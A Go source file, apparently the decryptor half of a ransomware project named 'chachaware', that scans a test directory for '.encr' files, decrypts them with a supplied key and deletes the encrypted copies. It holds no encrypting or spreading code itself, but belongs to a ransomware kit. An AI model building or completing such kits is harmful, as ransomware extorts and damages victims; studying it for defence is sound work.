package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"chachaware/crypto"
	"chachaware/scanner"
	"strings"
	"sync"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("invalid number of arguments; usage: keygen {key}")
		return
	}

	// Start recovery
	secret, _ := base64.RawURLEncoding.DecodeString(os.Args[1])

	wp := newWorkerPool(secret, 256)
	for _, s := range getScanners(wp) {
		s.Run()
	}

	// Wait until workers are finished
	close(wp.files)
	wp.wg.Wait()
}

func getScanners(w workerPool) []scanner.Scanner {
	// Configuration of targeted directories and extensions
	return []scanner.Scanner{
		{
			Dir:        "/home/job/test",
			Extensions: map[string]struct{}{".encr": {}},
			Action:     w.enqueueFile,
		},
	}
}

type workerPool struct {
	secret []byte

	files chan string
	wg    *sync.WaitGroup
}

func newWorkerPool(secret []byte, workersCount int) (s workerPool) {
	s.secret = secret
	s.files = make(chan string)
	s.wg = &sync.WaitGroup{}
	s.wg.Add(workersCount)

	// Start workers
	for i := 0; i < workersCount; i++ {
		go s.worker()
	}
	return
}

func (w workerPool) enqueueFile(path string) {
	w.files <- path
}

func (w workerPool) worker() {
	defer w.wg.Done()
	for path := range w.files {
		in, err := os.Open(path)
		out, err2 := os.Create(strings.TrimSuffix(path, ".encr"))

		if err == nil && err2 == nil {
			if err = crypto.Decrypt(w.secret, in, out); err == nil {
				os.Remove(path)
			}
		} else {
			fmt.Printf("unable to recover \"%s\"\n", path)
		}

		in.Close()
		out.Close()
	}
}
